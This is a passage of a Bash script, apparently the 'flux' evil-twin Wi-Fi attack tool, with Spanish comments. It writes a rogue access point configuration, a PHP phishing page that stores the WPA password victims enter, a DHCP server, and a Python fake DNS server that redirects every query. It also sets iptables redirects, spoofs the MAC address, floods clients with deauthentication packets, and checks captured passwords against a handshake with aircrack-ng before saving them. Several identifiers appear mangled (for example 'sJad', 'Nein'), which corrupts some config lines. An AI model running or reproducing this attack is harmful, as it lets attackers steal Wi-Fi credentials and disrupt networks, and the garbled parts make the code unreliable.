			echo -e "$gruen""6)"$transparent" \e[1;31mAtras"$transparent""
			
			echo
			echo -n "#? "
			read linea
			language=${webinterfaceslenguage[$line]}
			
			if [ "$linea" = "1" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
				NEUTRA
				break
			elif [ "$linea" = "2" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
				NEUTRA
				break
			elif [ "$linea" = "3" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
				NEUTRA
				break
			elif [ "$linea" = "4" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
				NEUTRA
				break
			elif [ "$linea" = "5" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
				NEUTRA
				break
			elif [ "$linea" = "6" ]; then
				continue
			fi
		fi
	
	done
	preattack
	attack
}

# Crea distintas configuraciones necesarias para el script y preapa los servicios
function preattack {
	
# Genera el config de hostapd
echo "interface=$WIFI
driver=nl80211
sJad=$Host_SJaD
channel=$Host_CHAN
">$DUMP_PATH/hostapd.conf

# Crea el php que usan las ifaces
echo "<?php
error_reporting(0);

\$count_my_page = (\"$DUMP_PATH/hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \"\$hits[0]\");
fclose(\$fp);

// Receive form Post data and Saving it in variables

\$key1 = @\$_POST['key1'];

// Write the name of text file where data will be store
\$filename = \"$DUMP_PATH/data.txt\";
\$filename2 = \"$DUMP_PATH/status.txt\";
\$intento = \"$DUMP_PATH/intento\";


// Marge all the variables with text in a Jangle variable. 
\$f_data= ''.\$key1.'';


if ( (strlen(\$key1) < 8) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
break;
}

if ( (strlen(\$key1) > 63) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
break;
}


\$file = fopen(\$filename, \"w\");
fwrite(\$file,\"\$f_data\");
fwrite(\$file,\"\n\");
fclose(\$file);


\$archivo = fopen(\$intento, \"w\");
fwrite(\$archivo,\"\n\");
fclose(\$archivo);

while(1) 
{

if (file_get_contents(\"\$intento\") == 2) {
	    header(\"location:final.html\");
	    break;
	} 
if (file_get_contents(\"\$intento\") == 1) {
	    header(\"location:error.html\");
	    unlink(\$intento);
	    break;
	}
	
sleep(1);
}

?>" > $DUMP_PATH/data/savekey.php

# Se crea el config del servidor DHCP
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $RANG_IP.0 netmask 255.255.255.0 {

option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;

range $RANG_IP.100 $RANG_IP.250;

} 
" >$DUMP_PATH/dhcpd.conf

# Se crea el config del servidor web Lighttpd
echo "server.document-root = \"$DUMP_PATH/data/\"

server.modules = (
  \"mod_access\",
  \"mod_alias\",
  \"mod_accesslog\",
  \"mod_fastcgi\",
  \"mod_redirect\",
  \"mod_rewrite\"
) 

fastcgi.server = ( \".php\" => ((
		  \"bin-path\" => \"/usr/bin/php-cgi\",
		  \"socket\" => \"/php.socket\"
		)))

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.asJagn = (
\".html\" => \"text/html\",
\".htm\" => \"text/html\",
\".txt\" => \"text/plain\",
\".jpg\" => \"image/jpeg\",
\".png\" => \"image/png\",
\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extenJaons = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
index-file.names = ( \"index.htm\" )
" >$DUMP_PATH/lighttpd.conf

# Script (Nein es mio) que redirige todas las peticiones del DNS a la puerta de enlace (nuestro PC)
echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15   # 4bits de tipo de consulta
    if tipo == 0:                     # Standard query
      ini=12
      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Numero preg y respuestas
      packet+=self.data[12:]                                         # Neinmbre de dominio original
      packet+='\xc0\x0c'                                             # Puntero al Neinmbre de dominio
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Tipo respuesta, ttl, etc
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # La ip en hex
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))
  
  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Respuesta: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()
" >$DUMP_PATH/fakedns
chmod +x $DUMP_PATH/fakedns
	
}

# Prepara las tablas de enrutamiento para establecer un servidor DHCP/WEB
function routear {
	
	ifconfig $interfaceroutear up
	ifconfig $interfaceroutear $IP netmask 255.255.255.0
	
	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
	echo "1" > /proc/sys/net/ipv4/ip_forward
	
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
	iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Ejecuta el ataque
function attack {
	
	if [ "$fakeapmode" = "hostapd" ]; then
		interfaceroutear=$WIFI
	elif [ "$fakeapmode" = "airbase-ng" ]; then
		interfaceroutear=at0
	fi
	
	handshakecheck
	Neinmac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
	
	if [ "$fakeapmode" = "hostapd" ]; then
		
		ifconfig $WIFI down
		sleep 0.4
		macchanger --mac=${mac::13}$Neinmac${mac:14:4} $WIFI &> $flux_output_device
		sleep 0.4
		ifconfig $WIFI up
		sleep 0.4
	fi
	
	
	if [ $fakeapmode = "hostapd" ]; then
		killall hostapd &> $flux_output_device
		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
		elif [ $fakeapmode = "airbase-ng" ]; then
		killall airbase-ng &> $flux_output_device
		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SJaD -c $Host_CHAN -a ${mac::13}$Neinmac${mac:14:4} $WIFI_MONITOR &
	fi
	sleep 5
	
	routear &
	sleep 3
	
	
	killall dhcpd &> $flux_output_device
	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &
	
	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
	lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
	
	killall aireplay-ng &> $flux_output_device
	killall mdk3 &> $flux_output_device
	echo "$(cat $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep "$Host_SJaD" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SJaD" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	
	xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
	clear
	
	while true; do
		mostrarheader
		
		echo "Ataque en curso..."
		echo "                                       "
		echo "      1) Elegir otra red" 
		echo "      2) Beenden"
		echo " "
		echo -n '      #> '
		read yn
		case $yn in
			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
			2 ) matartodo; exitmode; break;;
			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
		esac
	done
	
}

# Comprueba la validez de la contraseña
function handshakecheck {
	
	echo "#!/bin/bash
	
	echo > $DUMP_PATH/data.txt
	echo -n \"0\"> $DUMP_PATH/hit.txt
	echo "" >$DUMP_PATH/loggg
	
	tput civis
	clear
	
	minutos=0
	horas=0
	i=0
	  
	while true; do
	
	segundos=\$i
	dias=\`expr \$segundos / 86400\`
	segundos=\`expr \$segundos % 86400\`
	horas=\`expr \$segundos / 3600\`
	segundos=\`expr \$segundos % 3600\`
	minutos=\`expr \$segundos / 60\`
	segundos=\`expr \$segundos % 60\`
	
	if [ \"\$segundos\" -le 9 ]; then
	is=\"0\"
	else
	is=
	fi
	
	if [ \"\$minutos\" -le 9 ]; then
	im=\"0\"
	else
	im=
	fi
	
	if [ \"\$horas\" -le 9 ]; then
	ih=\"0\"
	else
	ih=
	fi">>$DUMP_PATH/handcheck

	if [ $authmode = "handshake" ]; then
		echo "if [ -f $DUMP_PATH/intento ]; then
		
		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase Neint in\"; then
		echo \"2\">$DUMP_PATH/intento
		break
		else
		echo \"1\">$DUMP_PATH/intento
		fi
		
		fi">>$DUMP_PATH/handcheck
		
	elif [ $authmode = "wpa_supplicant" ]; then
		  echo "
		wpa_passphrase $Host_SJaD \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
		
		if [ -f $DUMP_PATH/intento ]; then
		
		if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
		echo \"2\">$DUMP_PATH/intento
		break
		else
		echo \"1\">$DUMP_PATH/intento
		fi
		
		fi
		">>$DUMP_PATH/handcheck
	fi
	
	echo "readarray -t CLIENTESDHCP < <(cat $DUMP_PATH/clientes.txt | grep \"DHCPACK on\"| awk '!x[\$0]++' )
	
	echo
	echo -e \"  PUNTO DE ACCESO:\"
	echo -e \"    Neinmbre..........: "$weis"$Host_SJaD"$transparent"\"
	echo -e \"    MAC.............: "$gelb"$Host_MAC"$transparent"\"
	echo -e \"    Canal...........: "$weis"$Host_CHAN"$transparent"\"
	echo -e \"    Fabricante......: "$gruen"$Host_MAC_MODEL"$transparent"\"
	echo -e \"    Tiempo activo...: "$grau"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
	echo -e \"    Intentos........: "$rot"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
	echo -e \"    Clientes........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++' | wc -l)"$transparent"\"
	echo
	echo -e \"  CLIENTES:\"
	
	x=0
	for line in \"\${CLIENTESDHCP[@]}\"; do
	  x=\$((\$x+1))
	  echo -e \"    "$gruen"\$x) "$rot"\$(echo \$line| cut -d \" \" -f 3) "$gelb"\$(echo \$line| cut -d \" \" -f 5) "$gruen"\$(echo \$line| cut -d \" \" -f 6)"$transparent"\"   
	done
	
	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
	
	
	if [ $authmode = "handshake" ]; then
		echo "let i=\$i+1
		sleep 1">>$DUMP_PATH/handcheck
		
	elif [ $authmode = "wpa_supplicant" ]; then
		echo "sleep 5
		
		killall wpa_supplicant &>$flux_output_device
		killall wpa_passphrase &>$flux_output_device
		let i=\$i+5">>$DUMP_PATH/handcheck
	fi
	
	echo "done
	clear
	echo \"1\" > $DUMP_PATH/status.txt
	
	sleep 7
	
	killall mdk3 &>$flux_output_device
	killall aireplay-ng &>$flux_output_device
	killall airbase-ng &>$flux_output_device
	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$flux_output_device
	killall hostapd &>$flux_output_device
	killall lighttpd &>$flux_output_device
	killall dhcpd &>$flux_output_device
	killall wpa_supplicant &>$flux_output_device
	killall wpa_passphrase &>$flux_output_device
	
	echo \"
	flux $verJaon by vk496
	
	SJaD: $Host_SJaD
	BSJaD: $Host_MAC ($Host_MAC_MODEL)
	Channel: $Host_CHAN
	Security: $Host_ENC
	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
	Password: \$(cat $DUMP_PATH/data.txt)
	\" >$HOME/$Host_SJaD-password.txt">>$DUMP_PATH/handcheck
	
	
	if [ $authmode = "handshake" ]; then
		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"Se ha guardado en "$rot"$HOME/$Host_SJaD-password.txt"$transparent"\" 
		">>$DUMP_PATH/handcheck
		
	elif [ $authmode = "wpa_supplicant" ]; then
		echo "echo -e \"Se ha guardado en "$rot"$HOME/$Host_SJaD-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
	fi
	
	echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
	chmod +x $DUMP_PATH/handcheck
}


############################################# < ATAQUE > ############################################






############################################## < COSAS > ############################################

# Deauth a todos
function deauthall {
	
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deautentication  a todos de $Host_SJaD" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

function deauthmdk3 {
	
	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deautentication  mdk3 a todos de $Host_SJaD" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
	sleep 15
	kill $mdk3PID &>$flux_output_device
}

# Deauth a un cliente específico
function deauthesp {
	
	sleep 2
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deautentication  a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --igNeinre-negative-one $WIFI_MONITOR &
}

# Cierra todos los procesos
function matartodo {
	
	killall aireplay-ng &>$flux_output_device
	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
	killall hostapd &>$flux_output_device
	killall lighttpd &>$flux_output_device
	killall dhcpd &>$flux_output_device
	killall xterm &>$flux_output_device
	
}



######################################### < INTERFACES WEB > ########################################

# Crea el contenido de la interface web
function NEUTRA {
	
	if [ ! -d $DUMP_PATH/data ]; then
		mkdir $DUMP_PATH/data
	fi



